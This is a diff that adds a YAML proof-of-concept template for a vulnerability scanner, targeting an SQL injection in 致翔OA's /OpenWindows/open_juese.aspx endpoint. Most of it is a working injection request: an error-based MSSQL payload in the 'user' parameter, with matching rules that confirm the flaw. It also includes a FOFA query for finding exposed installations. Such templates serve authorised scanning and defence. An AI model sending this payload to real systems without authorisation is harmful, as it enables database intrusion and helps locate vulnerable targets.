@@ -1,0 +1,17 @@
+id: poc-yaml-zxoa-open-juese-sqli
+info:
+  name: 致翔OA open_juese SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 致翔OA
+  fofa: app="致翔软件-致翔OA"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /OpenWindows/open_juese.aspx?key=1&name=1&user=-1)+and+1=sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--+&requeststr=
+  expression: status_code == 500 && contains(gbk_decode(body),"在将 nvarchar 值") &&
+    contains(gbk_decode(body),"转换成数据类型 int 时失败") && contains(body,t2)
+transport: http
